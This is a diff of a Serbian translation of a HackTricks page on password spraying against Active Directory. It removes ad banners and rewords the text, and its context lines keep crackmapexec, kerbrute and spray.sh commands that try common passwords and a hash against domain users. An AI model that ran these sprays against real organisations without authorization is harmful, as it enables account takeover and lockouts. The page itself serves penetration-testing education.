@@ -2,20 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Produbite svoje znanje o **Mobilnoj Bezbednosti** sa 8kSec Akademijom. Savladajte sigurnost iOS i Android-a kroz naše kurseve koji se mogu pratiti sopstvenim tempom i dobijite sertifikat:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 ## **Password Spraying**
 
-Kada pronađete nekoliko **validnih korisničkih imena**, možete pokušati sa najviše **uobičajenim lozinkama** (imajte na umu politiku lozinki okruženja) za svakog od otkrivenih korisnika.\
+Kada pronađete nekoliko **validnih korisničkih imena**, možete isprobati najviše **uobičajene lozinke** (imajte na umu politiku lozinki okruženja) sa svakim od otkrivenih korisnika.\
 Po **defaultu**, **minimalna** **dužina** **lozinke** je **7**.
 
 Liste uobičajenih korisničkih imena takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Obratite pažnju da **možete zaključati neke naloge ako pokušate sa nekoliko pogrešnih lozinki** (po defaultu više od 10).
+Imajte na umu da **možete zaključati neke naloge ako pokušate nekoliko pogrešnih lozinki** (po defaultu više od 10).
 
 ### Get password policy
 
@@ -45,7 +40,7 @@ crackmapexec smb <IP> -u users.txt -p passwords.txt
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-- Korišćenje [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
+- Koristeći [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
@@ -56,7 +51,7 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Koristeći [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIJE PREPORUČENO, PONEKAD NE RADI
+- Korišćenje [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIJE PREPORUČENO, PONEKAD NE RADI
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
@@ -130,10 +125,5 @@ Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i lo
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Produbite svoje znanje u **Mobilnoj Bezbednosti** sa 8kSec Akademijom. Savladajte iOS i Android bezbednost kroz naše kurseve koji se mogu pratiti sopstvenim tempom i dobijite sertifikat:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
